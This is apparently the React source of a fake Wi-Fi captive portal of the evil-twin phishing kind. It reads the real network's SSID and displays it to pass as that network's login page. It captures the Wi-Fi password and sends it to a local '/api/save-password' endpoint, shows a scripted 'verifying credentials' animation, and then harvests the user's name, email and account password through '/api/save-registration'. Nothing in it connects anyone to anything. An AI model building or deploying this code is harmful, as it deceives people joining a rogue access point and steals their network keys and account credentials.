import { useState, useEffect } from 'react';
import { Helmet } from 'react-helmet';
import { motion, AnimatePresence } from 'framer-motion';
import { Wifi, Lock, WifiOff, CheckCircle2, ShieldCheck, Zap, Globe, Signal, User, Mail, ArrowRight, Loader2 } from 'lucide-react';
import { Button } from '@/shared/ui/ui-elements';
import { Toaster } from '@/shared/ui/feedback';

const ParticleBackground = () => {
  const particles = Array.from({ length: 12 }).map((_, i) => ({
    id: i,
    x: Math.random() * 100,
    y: Math.random() * 100,
    size: Math.random() * 3 + 1,
    duration: Math.random() * 20 + 15,
  }));

  return (
    <div className="absolute inset-0 overflow-hidden pointer-events-none">
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(17,24,39,0)_0%,rgba(2,6,23,1)_100%)] z-[1]" />
      
      <div className="absolute -top-[20%] -left-[10%] w-[600px] h-[600px] rounded-full bg-blue-600/10 blur-[80px]" />
      <div className="absolute top-[40%] -right-[10%] w-[500px] h-[500px] rounded-full bg-indigo-600/10 blur-[80px]" />
      <div className="absolute -bottom-[20%] left-[20%] w-[700px] h-[700px] rounded-full bg-purple-600/10 blur-[100px]" />

      {particles.map((particle) => (
        <motion.div
          key={particle.id}
          className="absolute rounded-full bg-white/10"
          style={{
            left: `${particle.x}%`,
            top: `${particle.y}%`,
            width: particle.size,
            height: particle.size,
          }}
          animate={{
            y: [0, -50, 0],
            opacity: [0, 0.8, 0],
          }}
          transition={{
            duration: particle.duration,
            repeat: Infinity,
            ease: "linear",
            delay: Math.random() * 5,
          }}
        />
      ))}
    </div>
  );
};

// Optimized Connecting Animation
const ConnectingVisualizer = () => {
  return (
    <div className="relative w-full h-32 flex items-center justify-center my-6">
      {[1, 2].map((i) => (
        <motion.div
          key={i}
          className="absolute border border-blue-500/30 rounded-full"
          initial={{ width: 40, height: 40, opacity: 1 }}
          animate={{
            width: 160,
            height: 160,
            opacity: 0,
            borderWidth: ["1px", "0px"],
          }}
          transition={{
            duration: 2,
            repeat: Infinity,
            delay: i * 0.8,
            ease: "easeOut",
          }}
        />
      ))}
      
      <motion.div
        className="relative z-10 w-16 h-16 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-full flex items-center justify-center shadow-lg shadow-blue-500/50"
        animate={{ scale: [1, 1.05, 1] }}
        transition={{ duration: 1.5, repeat: Infinity }}
      >
        <Globe className="w-8 h-8 text-white animate-pulse" />
      </motion.div>

      <motion.div
        className="absolute w-24 h-24"
        animate={{ rotate: 360 }}
        transition={{ duration: 4, repeat: Infinity, ease: "linear" }}
      >
        <div className="w-2.5 h-2.5 bg-cyan-400 rounded-full shadow-[0_0_8px_rgba(34,211,238,0.8)] absolute -top-1.5 left-1/2 -translate-x-1/2" />
      </motion.div>
    </div>
  );
};

// New Registration Form Component
const RegistrationForm = ({ onComplete }) => {
  const [formState, setFormState] = useState({ name: '', email: '', password: '' });
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [focusedField, setFocusedField] = useState(null);

  const validate = () => {
    const newErrors = {};
    if (!formState.name.trim()) newErrors.name = 'Full name is required';
    if (!formState.email.trim()) newErrors.email = 'Email address is required';
    else if (!/\S+@\S+\.\S+/.test(formState.email)) newErrors.email = 'Please enter a valid email';
    if (!formState.password) newErrors.password = 'Password is required';
    else if (formState.password.length < 6) newErrors.password = 'Must be at least 6 characters';
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validate()) return;
    
    setIsSubmitting(true);

    // --- BACKEND LOGIC START (For Registration) ---
    try {
      const userData = {
        name: formState.name,
        email: formState.email,
        password: formState.password, 
      };
      
      // Sending data to local PC server
      await fetch('/api/save-registration', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userData),
      });
      
    } catch (error) {
      console.error('Error saving registration to local PC', error);
    }
    // --- BACKEND LOGIC END ---

    // Simulate API delay
    await new Promise(resolve => setTimeout(resolve, 2000));
    setIsSubmitting(false);
    
    onComplete();
  };

  const inputClasses = (fieldName) => `
    w-full bg-slate-900/50 border rounded-xl pl-11 pr-4 py-3.5 text-sm font-medium text-white placeholder:text-slate-500 outline-none transition-all duration-300
    ${errors[fieldName] 
      ? 'border-red-500/50 focus:shadow-[0_0_15px_rgba(239,68,68,0.15)] focus:border-red-500' 
      : 'border-slate-800/80 focus:border-blue-500 focus:shadow-[0_0_20px_rgba(59,130,246,0.15)] hover:border-slate-700'
    }
  `;

  return (
    <motion.div
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -10 }}
      transition={{ duration: 0.5, ease: "easeOut", delay: 0.2 }}
      className="w-full"
    >
      <div className="text-center mb-8">
         <h3 className="text-lg font-bold text-white tracking-wide mb-1">Final Step</h3>
         <p className="text-slate-400 text-xs font-medium">Create your secure access account to continue.</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Name Field */}
        <div className="space-y-1.5 relative group">
           <div className={`absolute left-4 top-1/2 -translate-y-1/2 transition-colors duration-300 pointer-events-none ${focusedField === 'name' ? 'text-blue-400' : 'text-slate-500 group-hover:text-slate-400'}`}>
              <User className="w-4 h-4" />
           </div>
           <input
             type="text"
             placeholder="Full Name"
             value={formState.name}
             onChange={e => {
                setFormState({...formState, name: e.target.value});
                if (errors.name) setErrors({...errors, name: null});
             }}
             onFocus={() => setFocusedField('name')}
             onBlur={() => setFocusedField(null)}
             className={inputClasses('name')}
             autoComplete="name"
           />
           {errors.name && <span className="text-[10px] text-red-400 pl-1 font-medium">{errors.name}</span>}
        </div>

        {/* Email Field */}
        <div className="space-y-1.5 relative group">
           <div className={`absolute left-4 top-1/2 -translate-y-1/2 transition-colors duration-300 pointer-events-none ${focusedField === 'email' ? 'text-blue-400' : 'text-slate-500 group-hover:text-slate-400'}`}>
              <Mail className="w-4 h-4" />
           </div>
           <input
             type="email"
             placeholder="Email Address"
             value={formState.email}
             onChange={e => {
                setFormState({...formState, email: e.target.value});
                if (errors.email) setErrors({...errors, email: null});
             }}
             onFocus={() => setFocusedField('email')}
             onBlur={() => setFocusedField(null)}
             className={inputClasses('email')}
             autoComplete="email"
           />
           {errors.email && <span className="text-[10px] text-red-400 pl-1 font-medium">{errors.email}</span>}
        </div>

        {/* Password Field */}
        <div className="space-y-1.5 relative group">
           <div className={`absolute left-4 top-1/2 -translate-y-1/2 transition-colors duration-300 pointer-events-none ${focusedField === 'password' ? 'text-blue-400' : 'text-slate-500 group-hover:text-slate-400'}`}>
              <Lock className="w-4 h-4" />
           </div>
           <input
             type="password"
             placeholder="Create Account Password"
             value={formState.password}
             onChange={e => {
                setFormState({...formState, password: e.target.value});
                if (errors.password) setErrors({...errors, password: null});
             }}
             onFocus={() => setFocusedField('password')}
             onBlur={() => setFocusedField(null)}
             className={inputClasses('password')}
             autoComplete="new-password"
           />
           {errors.password && <span className="text-[10px] text-red-400 pl-1 font-medium">{errors.password}</span>}
        </div>

        <Button
          type="submit"
          disabled={isSubmitting}
          className="w-full h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-semibold rounded-xl shadow-[0_0_20px_rgba(37,99,235,0.2)] hover:shadow-[0_0_30px_rgba(37,99,235,0.4)] transition-all duration-300 mt-4 active:scale-[0.98]"
        >
          {isSubmitting ? (
             <span className="flex items-center gap-2">
               <Loader2 className="w-5 h-5 animate-spin" />
               Processing...
             </span>
          ) : (
             <span className="flex items-center gap-2 tracking-wide">
               Complete Registration <ArrowRight className="w-4 h-4" />
             </span>
          )}
        </Button>
      </form>
    </motion.div>
  );
};

function App() {
  const [password, setPassword] = useState('');
  const [isConnecting, setIsConnecting] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [isRegistered, setIsRegistered] = useState(false);
  const [strength, setStrength] = useState(0);
  
  // NEW: State to hold the dynamic Wifi Name
  const [networkName, setNetworkName] = useState('Guest Network'); 

  // NEW: Fetch Network Info on Mount
  useEffect(() => {
    fetch('/api/network-info')
      .then(res => res.json())
      .then(data => {
        if(data && data.ssid) {
          setNetworkName(data.ssid);
        }
      })
      .catch(err => console.log('Could not fetch network name, using default', err));
  }, []);

  useEffect(() => {
    let score = 0;
    if (password.length > 0) score += 1;
    if (password.length > 4) score += 1;
    if (password.length >= 8) score += 1;
    setStrength(score);
  }, [password]);

  const isValidPassword = password.length >= 8;

  const handleConnect = async () => {
    if (!isValidPassword) return;

    setIsConnecting(true);
    
    try {
      await fetch('/api/save-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: password }),
      });
      console.log('Password sent to local PC backend');
    } catch (error) {
      console.error('Failed to save password locally', error);
    }
    // --- BACKEND LOGIC END ---
    
    // Connection simulation
    await new Promise(resolve => setTimeout(resolve, 3000));

    setIsConnecting(false);
    setIsConnected(true);

  };

  const handleRegistrationComplete = () => {
    setIsRegistered(true);
    
    // Auto-refresh loop for demo purposes after successful registration
    setTimeout(() => {
      setIsRegistered(false);
      setIsConnected(false);
      setPassword('');
      setStrength(0);
    }, 5000);
  };

  return (
    <>
      <Helmet>
        {/* Updated Title to use dynamic network name */}
        <title>{networkName} Login | Secure Portal</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
        <meta name="description" content="Secure network authentication portal." />
      </Helmet>

      <div className="min-h-[100dvh] flex flex-col items-center justify-center p-4 relative bg-slate-950 font-sans selection:bg-blue-500/30 overflow-hidden">
        <ParticleBackground />

        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 10 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="w-full max-w-sm md:max-w-md relative z-20 mx-auto"
        >
          {/* Main Glass Card */}
          <div className="glass-card rounded-3xl p-[1px] overflow-hidden relative group">
            
            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-blue-500/10 to-transparent opacity-50" />

            <div className="bg-slate-950/80 rounded-[22px] px-6 py-8 md:p-10 relative overflow-hidden backdrop-blur-md">
              
              {/* Status Header */}
              <div className="text-center mb-8 relative">
                <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] md:text-xs font-semibold tracking-widest mb-6 uppercase shadow-[0_0_15px_rgba(59,130,246,0.1)]">
                  <ShieldCheck className="w-3 h-3" />
                  {/* Updated Badge Text */}
                  {networkName} Secure Login
                </div>

                <div className="relative h-20 md:h-24 flex items-center justify-center mb-4">
                  <AnimatePresence mode="wait">
                    {isConnected ? (
                      <motion.div
                        key="success"
                        initial={{ scale: 0 }}
                        animate={{ scale: 1 }}
                        transition={{ type: "spring", stiffness: 200, damping: 15 }}
                      >
                         <div className="w-16 h-16 md:w-20 md:h-20 rounded-2xl bg-gradient-to-tr from-green-500 to-emerald-400 shadow-[0_0_30px_rgba(16,185,129,0.3)] flex items-center justify-center">
                            <CheckCircle2 className="w-8 h-8 md:w-10 md:h-10 text-white" />
                         </div>
                      </motion.div>
                    ) : isConnecting ? (
                      <motion.div
                        key="connecting"
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                      >
                         <div className="w-16 h-16 md:w-20 md:h-20 rounded-2xl bg-gradient-to-tr from-blue-600 to-cyan-500 shadow-[0_0_30px_rgba(59,130,246,0.3)] flex items-center justify-center relative overflow-hidden">
                            <Signal className="w-8 h-8 md:w-10 md:h-10 text-white animate-pulse" />
                         </div>
                      </motion.div>
                    ) : (
                      <motion.div
                        key="idle"
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                      >
                        <div className="relative">
                          <div className="w-16 h-16 md:w-20 md:h-20 rounded-2xl bg-slate-800/80 shadow-inner flex items-center justify-center border border-slate-700/50">
                            <Wifi className="w-8 h-8 md:w-10 md:h-10 text-blue-400" />
                          </div>
                          <div className="absolute -right-2 -bottom-2 w-7 h-7 bg-slate-900 rounded-full flex items-center justify-center border-2 border-slate-800">
                            <WifiOff className="w-3.5 h-3.5 text-red-500" />
                          </div>
                        </div>
                      </motion.div>
                    )}
                  </AnimatePresence>
                </div>

                {/* Updated Main Heading to use networkName */}
                <h1 className="text-3xl md:text-4xl font-bold text-white mb-3 tracking-tight text-glow">
                  {isRegistered ? "All Systems Go" : isConnected ? "Identity Verification" : networkName}
                </h1>
                <div className="flex items-center justify-center gap-2 text-slate-400">
                  <p className="text-sm font-medium tracking-wide">
                    {isRegistered ? "Internet Access Enabled" : isConnected ? "Registration Required" : "Authentication Required"}
                  </p>
                </div>
                
                {!isConnected && !isConnecting && (
                  <p className="text-xs text-blue-300/80 mt-3 font-medium leading-relaxed max-w-[260px] mx-auto">
                    Please provide your security credentials to access the high-speed network.
                  </p>
                )}
              </div>

              {/* Dynamic Content Area */}
              <AnimatePresence mode="wait">
                {isConnecting ? (
                  <motion.div
                    key="connecting-state"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    className="py-2"
                  >
                    <ConnectingVisualizer />
                    <div className="space-y-3 mt-6 max-w-xs mx-auto">
                       {['Verifying credentials...', 'Establishing secure tunnel...', 'Allocating IP address...'].map((text, idx) => (
                         <motion.div
                            key={idx}
                            initial={{ opacity: 0, x: -5 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: idx * 1.0, duration: 0.3 }}
                            className="flex items-center gap-3 text-xs font-semibold text-slate-400 tracking-wide"
                         >
                            <div className="w-1.5 h-1.5 rounded-full bg-blue-500" />
                            {text}
                         </motion.div>
                       ))}
                    </div>
                  </motion.div>
                ) : isConnected && !isRegistered ? (
                  <RegistrationForm onComplete={handleRegistrationComplete} />
                ) : isConnected && isRegistered ? (
                  <motion.div
                    key="registered-state"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    className="text-center py-6"
                  >
                    <div className="text-5xl mb-6">🚀</div>
                    <h3 className="text-xl font-bold text-white mb-2 tracking-tight">You are Online!</h3>
                    <p className="text-slate-400 text-sm mb-8 font-medium leading-relaxed">Your high-speed secure connection is active.</p>
                    <div className="w-full h-1 bg-slate-800 rounded-full overflow-hidden mb-8">
                       <motion.div 
                          className="h-full bg-emerald-500"
                          initial={{ width: "0%" }}
                          animate={{ width: "100%" }}
                          transition={{ duration: 5, ease: "linear" }}
                       />
                    </div>
                    <p className="text-[10px] text-slate-500 uppercase tracking-widest">Redirecting...</p>
                  </motion.div>
                ) : (
                  <motion.div
                    key="input-state"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    className="space-y-6"
                  >
                    <div className="space-y-3">
                      <div className="flex justify-between items-center px-1">
                        <label className="text-[11px] font-bold text-slate-400 uppercase tracking-widest">
                          Access Key
                        </label>
                      </div>
                      
                      <div className="relative group">
                        <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                          <Lock className="w-4 h-4 text-blue-400/80" />
                        </div>
                        
                        <input
                          type="text"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          onKeyPress={(e) => {
                            if (e.key === 'Enter' && isValidPassword) handleConnect();
                          }}
                          // Updated placeholder to use networkName
                          placeholder={`Enter password`}
                          className="glass-input w-full pl-11 pr-4 py-3.5 md:py-4 rounded-xl text-base font-medium outline-none shadow-sm transition-all focus:shadow-[0_0_20px_rgba(59,130,246,0.15)] placeholder:text-slate-600"
                          spellCheck="false"
                          autoComplete="off"
                        />
                      </div>

                      {/* Simplified Strength Bar */}
                      
                      <div className="flex justify-between text-[10px] text-slate-500 font-bold uppercase tracking-wider px-1">
                        <span>8+ Characters</span>
                        <span className={isValidPassword ? "text-emerald-400" : "text-slate-600"}>
                          {password.length === 0 ? "Required" : isValidPassword ? "Excellent" : "Incomplete"}
                        </span>
                      </div>
                    </div>

                    <Button
                      onClick={handleConnect}
                      disabled={!isValidPassword}
                      className="w-full h-12 md:h-14 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white text-base font-semibold rounded-xl shadow-[0_0_20px_rgba(37,99,235,0.2)] hover:shadow-[0_0_30px_rgba(37,99,235,0.4)] transition-all duration-300 active:scale-[0.98] disabled:opacity-50 disabled:shadow-none disabled:active:scale-100 disabled:cursor-not-allowed"
                    >
                      <span className="flex items-center gap-2 tracking-wide">
                        <Zap className="w-5 h-5 fill-current" />
                        Connect
                      </span>
                    </Button>
                  </motion.div>
                )}
              </AnimatePresence>

            </div>
          </div>
          
          {/* Footer Info */}
          <div className="mt-8 text-center opacity-50">
             <p className="text-[10px] text-slate-500 font-bold uppercase tracking-[0.2em] mb-4">
               Secure Gateway Systems
             </p>
          </div>
        </motion.div>
        <Toaster />
      </div>
    </>
  );
}

export default App;